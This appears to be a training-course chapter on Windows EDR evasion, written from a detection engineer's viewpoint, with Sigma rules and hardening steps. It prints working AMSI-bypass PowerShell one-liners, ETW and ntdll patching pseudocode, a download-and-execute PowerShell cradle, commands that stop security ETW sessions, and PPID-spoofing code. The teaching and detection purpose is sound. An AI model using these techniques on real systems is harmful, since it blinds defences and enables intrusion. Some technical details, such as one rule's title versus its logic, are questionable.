---
corso: "Cybersecurity Masterclass"
fase: "Domain 11 — Malware and EDR"
modulo: "11.2"
titolo: "EDR Evasion and Platform-Specific Malware Tradecraft"
versione: "Windows 11 24H2+, macOS Sonoma 14+/Sequoia 15, Linux 6.x, CET shadow stacks, ESF 2.0+"
livello: "Advanced"
prerequisiti:
  - "Process injection and shellcode fundamentals (Chapter 11A)"
  - "Windows internals: PEB, ntdll, ETW, AMSI, WDAC (Domain 2)"
  - "macOS security architecture: SIP, TCC, Gatekeeper, ESF"
  - "Linux security: auditd, eBPF, PAM, kernel module signing"
  - "EDR architecture and telemetry sources (Sysmon, ETW, kernel callbacks)"
obiettivi:
  - "Demonstrate NTDLL unhooking, direct/indirect syscalls, and call-stack spoofing, then verify detection via ETW Threat Intelligence provider"
  - "Identify ETW patching and AMSI bypass artifacts using Sigma rules, Script Block Logging, and kernel-side integrity checks"
  - "Detect BYOVD attacks using Sysmon Event ID 6, Vulnerable Driver Blocklist validation, and HVCI enforcement"
  - "Analyze macOS evasion (TCC bypass, dylib hijacking, ESF deadline abuse) and apply detection via Endpoint Security Framework"
  - "Audit Linux persistence mechanisms (systemd, PAM, eBPF rootkits) and harden with auditd immutable rules, module signing, and ptrace_scope"
tag: [edr-evasion, ntdll-unhooking, syscalls, etw, amsi, byovd, macos-security, tcc, linux-rootkit, ebpf, detection-engineering, sigma, mitre-attack]
---

# Domain 11, Chapter 11B — EDR Evasion and Platform-Specific Malware Tradecraft

> **Learning objectives.** After completing this chapter, you will be able to: (1) reproduce and detect NTDLL unhooking variants (KnownDlls, suspended-process, peridot) using kernel-side telemetry; (2) trace direct and indirect syscall execution paths and identify evasion via call-stack analysis and Intel CET shadow stacks; (3) detect ETW patching, AMSI bypass, and PowerShell CLM circumvention through multi-source correlation; (4) analyze macOS persistence, TCC bypass, and Endpoint Security Framework evasion for incident response; (5) build comprehensive Linux detection coverage for fileless execution, eBPF rootkits, and auditd evasion using osquery, Falco, and auditd immutable rules.

> **Scope.** NTDLL unhooking (KnownDlls, section remapping, `.text` restoration). Direct and indirect syscalls (SysWhispers, Hell's Gate, Halo's Gate, Tartarus' Gate, RecycledGate, FreshyCalls). Hardware breakpoint syscall invocation. Call-stack spoofing (return address spoofing, stack frame fabrication). ETW patching and blind-spot exploitation. AMSI bypass (patching, CLR hooking, reflection, COM hijack, context corruption). PowerShell Constrained Language Mode bypass. AppLocker/WDAC bypass. .NET obfuscation, DInvoke, Unmanaged PowerShell, donut shellcode. PPID spoofing and command-line argument spoofing. macOS persistence (LaunchDaemons/Agents, dylib hijacking, DYLD_INSERT_LIBRARIES), TCC bypass (synthetic clicks, FDA abuse, database manipulation), code signing/notarization bypass, XProtect/MRT evasion, keychain extraction, Endpoint Security Framework evasion. Linux persistence (systemd, cron, PAM, SSH, initramfs, eBPF rootkits), fileless execution (memfd_create, /dev/shm), process injection (ptrace, /proc/PID/mem), specific rootkit tooling (Diamorphine, Reptile, TripleCross), auditd evasion, detection via osquery/auditd/Falco.
>
> **Orientation.** This chapter describes evasion techniques from the detection engineer's perspective: what the technique does, why current telemetry misses it, and what improved detection would catch it. The goal is that a detection engineer reading this chapter knows exactly what artifacts to look for and what telemetry gaps to close.

---

## 1. EDR evasion on Windows

### 1.1 The hooking model and its weaknesses

Most EDRs on Windows achieve visibility by hooking `ntdll.dll` — the user-mode gateway to the kernel. The EDR's DLL (injected into every process at startup via `AppInit_DLLs`, `CmRegisterCallback`-triggered load, or image-load kernel callback) overwrites the first bytes of critical `ntdll.dll` functions with a `jmp` (typically `E9` relative or `FF 25` absolute jump) to the EDR's inspection code. Common hooked functions: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtProtectVirtualMemory`, `NtMapViewOfSection`, `NtCreateSection`, `NtOpenProcess`, `NtQueueApcThread`, `NtSetContextThread`, `NtResumeThread`, `NtCreateFile`.

The hook trampoline typically saves registers, calls the EDR's analysis function (which logs ETW events, checks arguments against behavioral heuristics, and optionally blocks the call), then jumps to the original function body (saved in a trampoline buffer). The round-trip adds measurable latency (~2–10µs per hooked call).

The fundamental weakness: these hooks reside in user-mode memory mapped as `PAGE_EXECUTE_READ` in the process's address space. The attacker, executing within the same process, can change the page protection to `PAGE_EXECUTE_READWRITE`, overwrite the hooks, and restore the protection — or bypass the hooks entirely.

### 1.2 NTDLL unhooking

**Mechanism.** The attacker obtains a clean (unhooked) copy of `ntdll.dll` and overwrites the hooked `.text` section in memory with the clean version, restoring original syscall stubs.

**Sources for clean ntdll.**

| Source | Method | Notes |
|--------|--------|-------|
| `\KnownDlls\ntdll.dll` | `NtOpenSection` → `NtMapViewOfSection` | Kernel-maintained section object; always clean. Most common method |
| On-disk `ntdll.dll` | `NtCreateFile` → `NtCreateSection` → `NtMapViewOfSection` | Requires file-system access; some EDRs monitor reads of system DLLs |
| Suspended process | Create suspended child, read its ntdll `.text` via `NtReadVirtualMemory` | The child's ntdll may already be hooked if the EDR hooks during `NtCreateUserProcess` |
| Debug-object technique | Open ntdll via debug-object path to bypass EDR file monitoring | Uncommon but effective against file-system minifilter monitoring |

**Unhooking sequence (pseudocode).**

```
// Step 1: Open a clean copy of ntdll via KnownDlls
NtOpenSection(&hSection, SECTION_MAP_READ, &oa)  // oa.ObjectName = L"\\KnownDlls\\ntdll.dll"
NtMapViewOfSection(hSection, NtCurrentProcess(), &cleanBase, ..., PAGE_READONLY)

// Step 2: Locate the .text section in both copies
hooked_text = ntdll_base + ntdll_pe->sections[".text"].VirtualAddress
clean_text  = cleanBase  + clean_pe->sections[".text"].VirtualAddress
text_size   = ntdll_pe->sections[".text"].Misc.VirtualSize

// Step 3: Make the hooked .text writable
NtProtectVirtualMemory(NtCurrentProcess(), &hooked_text, &text_size, PAGE_EXECUTE_READWRITE, &old)

// Step 4: Overwrite with clean copy
memcpy(hooked_text, clean_text, text_size)

// Step 5: Restore protection
NtProtectVirtualMemory(NtCurrentProcess(), &hooked_text, &text_size, old, &old2)

// Step 6: Unmap the clean copy
NtUnmapViewOfSection(NtCurrentProcess(), cleanBase)
```

After this sequence, every `Nt*`/`Zw*` stub in the process's ntdll is restored to the original `mov r10, rcx; mov eax, <SSN>; syscall; ret` pattern. All EDR hooks are erased.

**Selective unhooking.** Instead of replacing the entire `.text` section (which is noisy), the attacker unhooks only the specific functions needed for the next operation — e.g., only `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` before performing process injection. This reduces the detection window.

**Peridot / module-stomping variant.** Instead of unhooking, the attacker maps a fresh ntdll copy at a different address (without touching the hooked copy) and calls functions from the fresh copy. The hooked copy remains intact, so integrity-checking tools that monitor it see no change. Detection requires monitoring for multiple ntdll mappings in a process.

**EDR bypass tool ecosystem.**

| Tool | Technique | Notes |
|------|-----------|-------|
| **SysWhispers** (v1) | Header-only; generates direct syscall stubs with hardcoded SSNs per OS version | Deprecated; version-specific |
| **SysWhispers2** | Generates stubs that resolve SSNs at runtime by sorting `Zw*` functions in ntdll's EAT by address (address order = SSN order) | Indirect syscall variant available |
| **SysWhispers3** | Adds egg-hunter technique — embeds a random marker in the syscall stub, patches it at runtime with the resolved SSN | Supports both direct and indirect |
| **Hell's Gate** | Reads SSN from the in-memory ntdll stub. Validates the stub bytes match `4C 8B D1 B8 XX XX 00 00` (unhhooked pattern) | Fails if the stub is hooked (first bytes overwritten) |
| **Halo's Gate** | If target stub is hooked, scans neighbor stubs (SSN ± 1, ± 2, ...) until finding an unhooked one. Derives the target SSN from the neighbor's SSN + offset | Resilient against partial hooking |
| **Tartarus' Gate** | Extends Halo's Gate: also checks if the hook's `jmp` target contains the original stub bytes (some EDR trampolines preserve the original prologue) | Handles more EDR implementations |
| **RecycledGate** | Uses exception-based indirect syscalls — sets a VEH, triggers an access violation at the syscall instruction, catches the exception, and executes the syscall from the exception context | Evades call-stack analysis (exception context has a clean stack) |
| **FreshyCalls** | Resolves SSNs via the same EAT-sorting technique as SysWhispers2, but also uses a `jmp` to a `syscall; ret` gadget in ntdll for indirect invocation | Combined resolution + indirect call |
| **LazyImporter** | Compile-time API hashing with runtime resolution via PEB → InMemoryOrderModuleList → EAT walk. Not syscall-specific but complements direct/indirect syscall tools | Used alongside other tools for IAT-less imports |

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| ETW `Microsoft-Windows-Kernel-Audit-API-Calls` | `NtProtectVirtualMemory` on ntdll `.text` | Page protection change from `PAGE_EXECUTE_READ` to `PAGE_EXECUTE_READWRITE` on ntdll's address range |
| ETW `Microsoft-Windows-Kernel-Process` | `NtMapViewOfSection` events | Second mapping of ntdll in a process (peridot detection) |
| Sysmon Event ID 7 (ImageLoaded) | ntdll mapped multiple times | Unusual — each process normally has exactly one ntdll mapping |
| EDR kernel callback | Periodic `.text` integrity check | Compare in-memory ntdll `.text` hash against expected hooked hash; a change to either the clean or hooked state is an indicator |
| ETW `Microsoft-Windows-Threat-Intelligence` | `NtReadVirtualMemory` on ntdll `.text` from another process | Cross-process read of ntdll content (suspended-process technique) |

Sigma rule:
```yaml
title: NTDLL .text Section Protection Changed
logsource:
  product: windows
  category: api_call
detection:
  selection:
    EventType: NtProtectVirtualMemory
    TargetModule: ntdll.dll
    TargetSection: .text
    NewProtection|contains: 'WRITE'
  condition: selection
level: critical
```

**Hardening.**

1. Deploy EDRs that combine user-mode hooks with kernel-mode telemetry (minifilters, `ObRegisterCallbacks`, ETW TI provider). User-mode-only EDRs are fundamentally bypassable.
2. Enable HVCI (Hypervisor-protected Code Integrity) — prevents loading unsigned kernel drivers that could be used as an alternative to user-mode unhooking.
3. Enable Microsoft's Threat Intelligence ETW provider (`Microsoft-Windows-Threat-Intelligence`, GUID `f4e1897c-bb5d-5668-f1d8-040f4d8dd344`) — requires PPL (Protected Process Light) to consume.
4. Monitor for multiple ntdll mappings per process via kernel callbacks or Sysmon.

---

### 1.3 Direct and indirect syscalls

**Direct syscalls — mechanism.** The malicious code contains its own `syscall` instruction with the appropriate SSN (System Service Number) in `EAX` and arguments arranged per the Windows x64 calling convention: `R10` = first arg (moved from `RCX` by the standard ntdll stub `mov r10, rcx`), `RDX` = second, `R8` = third, `R9` = fourth, stack for remaining. The `syscall` instruction traps directly to `KiSystemCall64` in the kernel, bypassing ntdll entirely.

**SSN resolution algorithms.**

**Hell's Gate algorithm:**
```
1. Get ntdll base from PEB → Ldr → InMemoryOrderModuleList (second entry)
2. Parse ntdll's EAT (Export Address Table)
3. For each target function (e.g., NtAllocateVirtualMemory):
   a. Find the function's address from the EAT
   b. Read the first 8 bytes at that address
   c. Verify pattern: 4C 8B D1 (mov r10, rcx) B8 XX XX 00 00 (mov eax, SSN)
   d. If pattern matches: extract SSN from bytes [4] and [5]
   e. If pattern doesn't match: the function is hooked → FAIL
```

**Halo's Gate algorithm (handles hooks):**
```
1-3. Same as Hell's Gate
   d. If pattern doesn't match (hook detected):
      i.  Check neighboring functions: address ± 0x20 (typical stub size)
      ii. Scan up (SSN - 1, - 2, ...) and down (SSN + 1, + 2, ...)
          until finding an unhooked stub
      iii. Read that stub's SSN
      iv. Target SSN = neighbor SSN ± offset
```

**Tartarus' Gate extension:**
```
If both the target and neighbors are hooked:
   i.  Follow the hook's jmp to the trampoline
   ii. Scan the trampoline for the preserved original bytes (4C 8B D1 B8 ...)
   iii. Extract SSN from the trampoline's copy of the original prologue
```

**SysWhispers3 egg-hunter:** At compile time, generates syscall stubs with a random marker byte sequence (`DB 'egg'`) where the SSN would go. At runtime, resolves the actual SSN (via EAT sorting) and patches the marker in the stub with the correct value. This avoids embedding resolved SSNs in the binary's data section (which static analysis tools scan for).

**Indirect syscalls — mechanism.** Instead of executing `syscall` from the attacker's code region (unbacked memory), the attacker:
1. Resolves the target function's address in ntdll
2. Locates the `syscall; ret` instruction sequence within that function (typically at offset +0x12 or +0x14 from the function start, after the `mov eax, SSN` bytes)
3. Sets up registers with the correct arguments and SSN
4. Executes `jmp` (not `call`) to the `syscall; ret` address

Result: the return address on the stack after `syscall` points into ntdll (legitimate), and the kernel-side call-stack capture sees ntdll as the caller. The EDR's inline hook at the function's entry point is never reached (the `jmp` targets bytes past the hook).

**Call-stack spoofing techniques.**

Even indirect syscalls can be detected by sophisticated EDRs that walk the full thread call stack — the frame above ntdll shows unbacked memory (the attacker's code).

**Return address spoofing.** Before the `syscall`, the attacker pushes a fake return address (pointing to a legitimate function like `kernel32!BaseThreadInitThunk`) onto the stack. After the syscall, the attacker must fix the stack to return to the actual caller. Variant: `jmp` to a `call [rsp]; ret` gadget in a legitimate DLL, setting `[rsp]` to point to the desired ntdll `syscall; ret`.

**Stack frame fabrication.** The attacker constructs a complete fake call stack — multiple frames that mimic a legitimate call chain (e.g., `kernel32!CreateFileW` → `ntdll!NtCreateFile` → `syscall`). This requires knowing the expected frame sizes and saved RBP values.

**Thread stack spoofing via NtSetContextThread.** The attacker creates a suspended thread, sets its context (RIP, RSP, RBP, and the entire stack contents) to a fabricated call stack using `NtSetContextThread`, then resumes. The resumed thread executes the syscall with a completely clean-looking stack. After execution, the thread is suspended again, and the original context restored.

**Sleep masking / call-stack encryption.** Between beacons, the C2 implant encrypts its own memory (using `SystemFunction032` or `VirtualProtect` + XOR), rewrites its stack frames to mimic legitimate wait patterns (e.g., `NtWaitForSingleObject` in `ntdll`), and sleeps. When the beacon fires, it decrypts and runs. This defeats both memory-scanning (encrypted shellcode regions) and sleep-time call-stack analysis.

Named implementations: **Ekko** (timer-based sleep with stack spoofing via `RtlCreateTimer`), **Zilean** (uses `NtContinue` for context switching), **Foliage** (APC-based sleep with encrypted stack).

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| ETW stack-walk events | Non-image frame in call chain | `syscall` return address or intermediate frame in unbacked (`MEM_PRIVATE`) or `PAGE_EXECUTE_READWRITE` memory |
| ETW `Microsoft-Windows-Threat-Intelligence` | `NtSetContextThread` setting debug registers or modifying RIP | Hardware breakpoint syscall technique; context hijacking |
| Sysmon Event ID 10 | `PROCESS_SET_INFORMATION` / `THREAD_SET_CONTEXT` | Thread context modification from cross-process or unusual source |
| Intel CET (Control-flow Enforcement) | Shadow Stack violation | Direct syscalls from non-CALL paths violate CET shadow-stack return-address tracking. CET-enabled processes will raise `#CP` (Control Protection) exceptions. Currently limited to Edge, Chrome, and specific Windows processes |
| Kernel callback | `PsSetCreateThreadNotifyRoutine` | Thread with start address in unbacked memory (timer-based stack spoofing creates threads) |
| Memory scan | Executable unbacked regions | Periodic scan for `PAGE_EXECUTE_READWRITE` or `PAGE_EXECUTE_READ` regions not backed by a file mapping |

Sigma rule:
```yaml
title: Hardware Breakpoint Modification via NtSetContextThread
logsource:
  product: windows
  category: process_access
detection:
  selection:
    EventID: 10
    GrantedAccess|contains:
      - '0x1FFFFF'
      - '0x001F0FFF'
    CallTrace|contains: 'ntdll.dll'
  filter_debuggers:
    SourceImage|endswith:
      - '\devenv.exe'
      - '\windbg.exe'
      - '\x64dbg.exe'
  condition: selection and not filter_debuggers
level: high
```

**Hardening.**

1. Enable Intel CET on supported hardware and OS (Windows 11 22H2+). CET shadow stacks make direct/indirect syscalls detectable at the hardware level.
2. Deploy EDRs that perform kernel-side call-stack analysis (walking the stack from the kernel trap handler, not relying on user-mode ETW).
3. Enable `Microsoft-Windows-Threat-Intelligence` ETW provider for `NtSetContextThread` monitoring.
4. Implement memory-scanning rules that flag unbacked executable regions in non-JIT processes (exclude known JIT engines: .NET CLR, V8, SpiderMonkey).

---

### 1.4 ETW patching

**Mechanism.** ETW is built on a producer-consumer model. User-mode producers call `EtwEventWrite` (ntdll) → `NtTraceEvent` (syscall) → kernel `EtwpEventWriteFull` → event delivered to consumers (kernel buffers → user-mode `ProcessTrace` / real-time consumers). Patching can occur at multiple levels:

**User-mode `EtwEventWrite` patching.** Overwrite the prologue of `ntdll!EtwEventWrite` with `xor eax, eax; ret` (4 bytes: `33 C0 C3`) or `ret` (1 byte: `C3`). All ETW events from the patched process are suppressed. This is the most common technique.

```
// Pseudocode
hNtdll = GetModuleHandle("ntdll.dll")
pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
VirtualProtect(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &old)
memcpy(pEtwEventWrite, "\x33\xC0\xC3", 3)  // xor eax, eax; ret (return STATUS_SUCCESS)
VirtualProtect(pEtwEventWrite, 4, old, &old2)
```

**`EtwEventWriteFull` patching.** Some tools also patch `EtwEventWriteFull` and `EtwEventWriteEx` for completeness — these are alternative entry points that some providers call directly.

**Provider-level disabling.** Each ETW provider has a `_ETW_REG_ENTRY` structure in kernel memory containing a `GuidEntry` pointing to the provider GUID and an `EnableMask`. By zeroing the `EnableMask` or setting `IsEnabled = 0` in user-accessible provider registration structures, the attacker disables specific providers without patching any functions. From user mode: manipulating the provider's `REGHANDLE` (which contains a pointer to the registration entry).

**`NtTraceControl` abuse.** The `NtTraceControl` syscall controls ETW sessions. With appropriate access, the attacker can stop tracing sessions, modify event filters, or unregister providers:
```
# logman — built-in Windows tool for ETW session management
logman stop "EventLog-Security" -ets
logman stop "Microsoft-Windows-Sysmon" -ets
logman update trace "SomeEDRSession" --p {provider-GUID} -ets --disable
```

**Thread-specific ETW context manipulation.** ETW events include the calling thread's context. An attacker can temporarily modify the thread's activity ID (`NtSetEvent` on the ETW activity GUID) or suppress events by setting thread-local ETW flags.

**ETW blind spots by provider.**

| Provider | What it misses (user-mode patching) | What still works (kernel-side) |
|----------|-------------------------------------|-------------------------------|
| `Microsoft-Windows-DotNETRuntime` | .NET JIT, Assembly.Load events suppressed | Kernel-mode ETW TI provider still sees process/thread creation |
| `Microsoft-Windows-PowerShell` | Script block logging events suppressed | Module-load kernel callbacks still fire |
| `Microsoft-Windows-Kernel-Process` | User-mode events suppressed | Kernel-side process/thread callbacks unaffected |
| `Microsoft-Windows-Threat-Intelligence` | Cannot be patched from user mode (requires PPL consumer) | Protected by design — primary defense against ETW patching |
| `Microsoft-Windows-Security-Auditing` | Cannot be patched (events generated by kernel/LSASS) | Always reliable for logon, audit events |

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| EDR periodic integrity check | `EtwEventWrite` prologue modified | Compare first bytes against known-good `4C 8B D1 48 83 ...` pattern |
| Kernel ETW | ETW session stopped/modified | `NtTraceControl` calls targeting security-relevant sessions |
| Behavioral | Process generates zero ETW events | A process that was previously emitting .NET/PowerShell events suddenly goes silent |
| Sysmon | Event gaps | Correlate: process is running (visible in kernel callbacks) but generating no Sysmon events — indicates ETW suppression |

Sigma rule:
```yaml
title: ETW Session Stopped via Logman
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\logman.exe'
    CommandLine|contains:
      - 'stop'
      - 'update'
      - '--disable'
  condition: selection
level: high
```

**Hardening.**

1. Use the `Microsoft-Windows-Threat-Intelligence` ETW provider — it requires a PPL (Protected Process Light) consumer, which cannot be patched by user-mode malware. This is the single most effective mitigation.
2. Protect ETW sessions: set session security descriptors to prevent non-admin modification.
3. Implement kernel-side ETW consumers that don't rely on user-mode `EtwEventWrite`.
4. Monitor for `logman` and `wevtutil` execution targeting ETW sessions.
5. Deploy canary ETW events: a watchdog periodically writes a canary event via `EtwEventWrite`; if the canary stops arriving at the consumer, ETW has been patched in that process.

---

### 1.5 AMSI bypass

**Mechanism.** AMSI (`amsi.dll`) is loaded into processes that execute dynamic content: PowerShell, .NET, VBScript, JScript, WMI, and Office VBA. The host calls `AmsiScanBuffer` (or `AmsiScanString`) before executing content. The registered provider (Windows Defender or a third-party AV) scans the content and returns `AMSI_RESULT_CLEAN`, `AMSI_RESULT_NOT_DETECTED`, or `AMSI_RESULT_DETECTED`.

**Bypass variants.**

**1. `AmsiScanBuffer` patching (classic).** Overwrite the first bytes of `AmsiScanBuffer` with instructions that set `AMSI_RESULT` to `AMSI_RESULT_CLEAN` and return:
```
// Classic patch bytes (frequently signatured — must be obfuscated)
// Original: mov edi, edi; push ebp; mov ebp, esp; ... (varies by build)
// Patched:  xor eax, eax; ret (return S_OK with result = 0 = AMSI_RESULT_CLEAN)
// Or:       mov eax, 0x80070057; ret (return E_INVALIDARG — caller treats as scan failure → allow)
```

**2. `AmsiInitialize` failure.** If `AmsiInitialize` returns a failure HRESULT, AMSI is never set up in the process. Technique: hook or patch `AmsiInitialize` to return `E_FAIL`. Some implementations corrupt the AMSI context handle early in the process, causing all subsequent `AmsiScanBuffer` calls to fail gracefully.

**3. `AmsiContext` corruption.** The `AMSI_CONTEXT` structure (returned by `AmsiInitialize`) contains a signature field (`AMSI` / `0x49534D41`). Corrupting this signature causes `AmsiOpenSession` to return `E_INVALIDARG`, bypassing all scanning for the session:
```powershell
# PowerShell reflection-based AmsiContext corruption
$ctxField = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiContext','NonPublic,Static')
$ctx = $ctxField.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32($ctx, 0x41444E41)  # overwrite signature
```

**4. CLR hooking / reflection bypass.** From within a .NET process, use reflection to access the internal `AmsiUtils` class in `System.Management.Automation.dll` and set the `amsiInitFailed` field to `$true`:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
This tells PowerShell that AMSI initialization failed, so it skips all AMSI calls. This specific technique is heavily signatured — modern implementations split the strings, use character arrays, or invoke via `Invoke-Expression` with encoded fragments.

**5. COM server hijacking.** AMSI providers register as COM servers. The attacker creates a registry key (`HKCU\Software\Classes\CLSID\{AMSI_PROVIDER_GUID}`) pointing `InProcServer32` to a DLL that always returns `AMSI_RESULT_CLEAN`. The per-user `HKCU` registration takes precedence over the machine-wide `HKLM` registration.

**6. PowerShell downgrade.** PowerShell v2 does not support AMSI. If .NET 2.0 is installed, `powershell.exe -Version 2` launches a v2 session. AMSI, script block logging, and Constrained Language Mode are all absent.

```
powershell.exe -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://...')"
```

**Detection.**

| Source | Signal | Details |
|--------|--------|---------|
| ETW `Microsoft-Windows-AMSI` | Provider reports `AMSI_RESULT_NOT_DETECTED` for known-malicious content | Indicates AMSI is bypassed or the provider is compromised |
| Sysmon Event ID 13 | Registry modification under `HKCU\...\CLSID\{AMSI GUID}` | COM hijack detection |
| PowerShell operational log | Event ID 400 (Engine Lifecycle) | `EngineVersion: 2.0` — PowerShell v2 downgrade |
| Integrity monitoring | `amsi.dll` `.text` section hash change | Patching detection |
| Script Block Logging | Event ID 4104 | Strings matching AMSI bypass patterns: `AmsiUtils`, `amsiInitFailed`, `AmsiScanBuffer`, `AmsiContext` |

Sigma rule:
```yaml
title: AMSI Bypass via PowerShell Reflection
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'AmsiUtils'
      - 'amsiInitFailed'
      - 'AmsiScanBuffer'
      - 'amsiContext'
  condition: selection
level: critical
```

Sigma rule (PowerShell v2 downgrade):
```yaml
title: PowerShell Downgrade to Version 2
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 400
    EngineVersion|startswith: '2.'
  condition: selection
level: high
```

**Hardening.**

1. Remove .NET 2.0 / 3.5 from all systems where not required:
```powershell
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```
2. Monitor COM registration changes in `HKCU` and `HKLM` for AMSI provider CLSIDs.
3. Enable PowerShell Script Block Logging at the infrastructure level (not process-level — survives in-process bypass):
```
GPO: Computer Configuration → Administrative Templates → Windows Components →
  Windows PowerShell → Turn on PowerShell Script Block Logging: Enabled
```
4. Deploy EDRs that perform kernel-side content inspection (not relying solely on AMSI).
5. Use WDAC (Windows Defender Application Control) to restrict PowerShell to Constrained Language Mode (§1.6).

---

### 1.6 PowerShell, .NET evasion, and application control bypass

**PowerShell Constrained Language Mode (CLM).** CLM restricts PowerShell to a safe subset: no .NET type access, no COM objects, no `Add-Type`, no `New-Object` for arbitrary types. CLM is enforced automatically when WDAC (or AppLocker in allow-mode) is active and the script is not in an allowed path/signer.

**CLM bypass techniques.**

| Technique | Method | Detection |
|-----------|--------|-----------|
| Custom runspace | Create a PowerShell runspace from C# (via `System.Management.Automation.dll`) in FullLanguage mode | Monitor for unusual hosts of `System.Management.Automation.dll` |
| Downgrade to PowerShell v2 | v2 doesn't enforce CLM | Event ID 400 with EngineVersion 2.x |
| `InstallUtil.exe` | .NET binary in allowed path; attacker wraps payload as an installer class | Sysmon Event ID 1 with `InstallUtil.exe` spawning suspicious child |
| MSBuild inline tasks | `MSBuild.exe` executes inline C# tasks from XML — present in .NET framework paths (allowed by default) | Monitor MSBuild execution outside build environments |

**AppLocker bypass.**

AppLocker restricts which executables, scripts, DLLs, and packaged apps can run, based on path, publisher, or hash rules.

Common bypasses:
- **LOLBAS (Living Off the Land Binaries and Scripts):** Microsoft-signed binaries in allowed paths that can execute arbitrary code: `MSBuild.exe`, `InstallUtil.exe`, `RegAsm.exe`, `RegSvcs.exe`, `MSHTA.exe`, `CMSTP.exe`, `Rundll32.exe`, `CertUtil.exe` (for download + decode), `WMIC.exe` (XSL transform execution).
- **DLL execution:** AppLocker DLL rules are not enforced by default. Without DLL rules, `rundll32.exe` can load any DLL.
- **Alternate data streams:** Payload hidden in NTFS ADS of an allowed file: `type payload.exe > allowed.txt:payload.exe && wmic process call create allowed.txt:payload.exe`.

**WDAC (Windows Defender Application Control).** WDAC is the successor to AppLocker for enterprise application control. WDAC policies are enforced by the kernel (Code Integrity — `ci.dll`), making them harder to bypass than AppLocker (which is a user-mode service).

WDAC bypass techniques:
- **Vulnerable signed drivers/binaries:** A signed binary with a known code-execution vulnerability (e.g., a version of `MSBuild.exe` with an unpatched feature) that is not blocked by the WDAC policy.
- **Policy weaknesses:** Policies with overly broad signer rules (trusting all Microsoft-signed binaries allows LOLBAS) or missing DLL enforcement.
- **WDAC policy tampering:** In audit mode, WDAC logs but doesn't block — the attacker runs freely. Switching from enforced to audit requires admin, but misconfigurations happen.

**WDAC hardening:**
```powershell
# Create a strict WDAC policy
New-CIPolicy -FilePath base.xml -Level Publisher -Fallback Hash -UserPEs
# Add recommended block rules (LOLBAS, vulnerable drivers)
Merge-CIPolicy -PolicyPaths base.xml, Microsoft-block-rules.xml -OutputFilePath merged.xml
# Convert to binary
ConvertFrom-CIPolicy merged.xml merged.p7b
# Deploy
Copy-Item merged.p7b C:\Windows\System32\CodeIntegrity\SIPolicy.p7b
```

**.NET in-memory assembly loading.**

Attackers load .NET assemblies entirely in memory to avoid touching disk:
```csharp
// Assembly.Load from byte array — no file on disk
byte[] assemblyBytes = Download("https://...");
Assembly asm = Assembly.Load(assemblyBytes);
asm.EntryPoint.Invoke(null, new object[] { args });
```

**Donut shellcode.** Donut converts .NET assemblies (and other payloads) into position-independent shellcode that bootstraps the CLR, loads the assembly from memory, and executes it — all without `Assembly.Load` appearing in the call stack (donut uses the unmanaged CLR hosting API `ICLRRuntimeHost::ExecuteInDefaultAppDomain` or creates a custom AppDomain).

**Unmanaged PowerShell via DInvoke.** DInvoke resolves `System.Management.Automation.dll` at runtime and creates a PowerShell runspace from unmanaged code — no `powershell.exe` process is created. The PowerShell engine runs inside the attacker's process (e.g., a sacrificial `notepad.exe`).

**PPID spoofing.** `CreateProcess` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` sets a fake parent process. The new process appears as a child of the spoofed parent in process trees — evading parent-child relationship heuristics (e.g., "alert when `cmd.exe` spawns from `winword.exe`").

```csharp
// PPID spoofing via STARTUPINFOEX
var si = new STARTUPINFOEX();
var lpAttributeList = new IntPtr();
InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref size);
UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
    ref parentHandle, IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
si.lpAttributeList = lpAttributeList;
CreateProcess(null, "cmd.exe", ..., ref si, out pi);
```

Detection: the process's parent PID (from `CreateProcess`) doesn't match the actual creating process (visible in ETW `Process_Create` events which log both the creating process and the declared parent). Sysmon Event ID 1 includes `ParentProcessId` (the declared parent) — compare with the actual creator from kernel callbacks.

**Command-line argument spoofing.** Create a process with benign command-line arguments (logged by Sysmon/Security log), then overwrite the `CommandLine` field in the PEB's `RTL_USER_PROCESS_PARAMETERS` before the process reads its arguments:
```
1. CreateProcess("cmd.exe", "/c echo benign", ..., CREATE_SUSPENDED)
2. ReadProcessMemory → locate PEB → ProcessParameters → CommandLine
3. WriteProcessMemory → overwrite CommandLine with "/c whoami > C:\out.txt"
4. ResumeThread
```

Security log Event ID 4688 records the original benign command line. The process executes the malicious one.

Detection: compare the command line logged at process creation with the process's actual PEB `CommandLine` at a later point (EDR agent periodic check). ETW `Microsoft-Windows-Threat-Intelligence` provider's process-creation events may capture the actual arguments.

---

### 1.7 Windows Defender and memory-scanning evasion

**Sleep masking.** Between C2 beacon callbacks, the implant encrypts its own memory (code + data) using `SystemFunction032` (RC4, exported from `advapi32.dll`) or `VirtualProtect` + XOR loop, marks the pages as `PAGE_READWRITE` (non-executable), and sleeps. When the beacon timer fires, the implant decrypts, marks executable, runs, then re-encrypts. This defeats periodic memory scanning (Defender's signature engine scanning for known shellcode patterns in memory).

**Module stomping (§11A 1.1 cross-ref).** Loading a legitimate DLL and overwriting its `.text` with shellcode makes the executable region appear backed by a signed DLL. Defender's memory scanner may skip image-backed regions that match known-good module signatures.

